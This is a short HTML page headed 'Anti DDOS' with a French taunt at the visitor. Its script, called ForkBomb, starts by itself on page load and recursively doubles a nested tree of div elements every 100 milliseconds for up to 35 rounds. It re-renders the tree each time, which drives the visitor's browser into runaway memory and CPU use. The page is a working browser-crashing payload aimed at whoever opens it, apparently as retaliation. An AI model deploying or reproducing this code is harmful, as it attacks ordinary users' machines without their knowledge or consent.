<html>
    <head>
    	<style>
			html,body {
				overflow: hidden;
			}

			#c div {
				min-width: 1px;
				min-height: 1px;
				margin: 10px;
				/* border: 1px solid #666; */
				float: left;
				overflow: hidden;
				border-radius: 100%;
				/* background: rgba(50, 50, 50, 0.1); */
			}
        </style>
    </head>
    <body>
        <h1>Anti DDOS</h1>
        <p>Il ne fallait pas faire le malin mon petit :)</p>
        <div id="c"></div>
    </body>
    <script>
        var ForkBomb = function App() {
			var _this = this;
			this.nodes = document.createElement('div');
			this.forkLimit = 35;
			this.totalNodeLength = 1;
			this.interval = null;

			this.destroy = function () {
				clearInterval(_this.interval);
			};

			this.bomb = function () {
				_this.interval = setInterval(function () {
					if (_this.nodes.childNodes.length < _this.forkLimit)
						_this.render();
					else 
						clearInterval(_this.interval);
				}, 100);
			};

			this.populateNodes = function (nodes) {
				[].forEach.call(nodes.childNodes, function (node) {
				_this.populateNodes(node);
				});
				nodes.appendChild(document.createElement('div'));
				_this.totalNodeLength++;
			};

			this.render = function () {
				_this.populateNodes(_this.nodes);
				document.getElementById('c').innerHTML = _this.nodes.outerHTML;
			};
        };

        var myApp;
        function init() {
			if (myApp)
				myApp.destroy();
			myApp = new ForkBomb();
			myApp.render();
			myApp.bomb();
        }

        window.addEventListener('DOMContentLoaded', init);
    </script>
</html> 
